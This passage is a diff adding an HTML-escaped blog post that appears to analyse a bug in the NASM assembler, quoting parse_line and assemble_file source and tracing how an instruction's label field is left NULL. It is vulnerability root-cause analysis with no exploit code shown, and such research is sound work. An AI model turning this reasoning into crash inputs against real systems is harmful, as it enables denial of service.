+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;operands&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;               &lt;span class=&quot;cm&quot;&gt;/* how many operands? 0-3 (more if db et al) */&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;addr_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;              &lt;span class=&quot;cm&quot;&gt;/* address size */&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;operand&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;oprs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MAX_OPERANDS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;     &lt;span class=&quot;cm&quot;&gt;/* the operands, defined as above */&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;extop&lt;/span&gt;           &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                  &lt;span class=&quot;cm&quot;&gt;/* extended operands */&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;eops_float&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;             &lt;span class=&quot;cm&quot;&gt;/* true if DD and floating */&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int32_t&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;times&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                  &lt;span class=&quot;cm&quot;&gt;/* repeat count (TIMES prefix) */&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;forw_ref&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;               &lt;span class=&quot;cm&quot;&gt;/* is there a forward reference? */&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;rex_done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;               &lt;span class=&quot;cm&quot;&gt;/* REX prefix emitted? */&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;rex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                    &lt;span class=&quot;cm&quot;&gt;/* Special REX Prefix */&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;vexreg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                 &lt;span class=&quot;cm&quot;&gt;/* Register encoded in VEX prefix */&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;vex_cm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                 &lt;span class=&quot;cm&quot;&gt;/* Class and M field for VEX prefix */&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;vex_wlp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                &lt;span class=&quot;cm&quot;&gt;/* W, P and L information for VEX prefix */&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;evex_p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;              &lt;span class=&quot;cm&quot;&gt;/* EVEX.P0: [RXB,R',00,mm], P1: [W,vvvv,1,pp] */&lt;/span&gt;
+                                            &lt;span class=&quot;cm&quot;&gt;/* EVEX.P2: [z,L'L,b,V',aaa] */&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;enum&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ttypes&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;evex_tuple&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;             &lt;span class=&quot;cm&quot;&gt;/* Tuple type for compressed Disp8*N */&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;evex_rm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                &lt;span class=&quot;cm&quot;&gt;/* static rounding mode for AVX512 (EVEX) */&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int8_t&lt;/span&gt;          &lt;span class=&quot;n&quot;&gt;evex_brerop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;            &lt;span class=&quot;cm&quot;&gt;/* BR/ER/SAE operand position */&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;insn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;assemble_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;StrList&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;depend_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;insn&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prev_offset_changed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stall_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Make sure we make forward progress... */&lt;/span&gt;
+
+    &lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;preproc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;globallineno&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nasm_limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LIMIT_LINES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;nasm_fatal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                           &lt;span class=&quot;s&quot;&gt;&quot;overall line count exceeds the maximum %&quot;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PRId64&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                           &lt;span class=&quot;n&quot;&gt;nasm_limit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LIMIT_LINES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+
+            &lt;span class=&quot;cm&quot;&gt;/*
+             * Here we parse our directives; this is not handled by the
+             * main parser.
+             */&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process_directives&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;end_of_line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Just do final cleanup */&lt;/span&gt;
+
+            &lt;span class=&quot;cm&quot;&gt;/* Not a directive, or even something that starts with [ */&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;parse_line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pass1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;&amp;lt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;optimizing&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;forwref&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;globallineno&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;forwref&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lineno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                    &lt;span class=&quot;n&quot;&gt;output_ins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;forw_ref&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;assemble_file&lt;/code&gt; function, there is an object (output_ins) to a structure (struct insn) which contains the informations regarding the opcode being parsed.
+Inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;assemble_file&lt;/code&gt;, a function &lt;code class=&quot;highlighter-rouge&quot;&gt;parse_line&lt;/code&gt; is called in order initialize the object.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;insn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;parse_line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;insn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;insn_is_label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eval_hints&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hints&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;opnum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;critical&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;first&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recover&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;nasm_static_assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;P_none&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;nl&quot;&gt;restart_parse:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;first&lt;/span&gt;               &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;forw_ref&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;stdscan_reset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;stdscan_set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdscan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tokval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prefixes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P_none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prefixes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;times&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* No TIMES either yet */&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Assume no label */&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;&amp;lt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eops&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* must do this, whatever happens */&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;operands&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* must initialize this */&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;evex_rm&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;    &lt;span class=&quot;cm&quot;&gt;/* Ensure EVEX rounding mode is reset */&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;evex_brerop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;cm&quot;&gt;/* Reset EVEX broadcasting/ER op position */&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Here the structure’s member label which should be containing the definition of the label is clearly being assigned to NULL.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TOKEN_ID&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;insn_is_label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TOKEN_INSN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;&amp;lt;--&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;taken&lt;/span&gt;
+        &lt;span class=&quot;cm&quot;&gt;/* there's a label here */&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;first&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tokval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t_charptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdscan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tokval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;':'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;         &lt;span class=&quot;cm&quot;&gt;/* skip over the optional colon */&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdscan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tokval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;nasm_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ERR_WARNING&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ERR_WARN_OL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ERR_PASS1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                  &lt;span class=&quot;s&quot;&gt;&quot;label alone on a line without a colon might be in error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TOKEN_INSN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tokval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t_integer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;I_EQU&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;cm&quot;&gt;/*
+             * FIXME: location.segment could be NO_SEG, in which case
+             * it is possible we should be passing 'absolute.segment'. Look into this.
+             * Work out whether that is *really* what we should be doing.
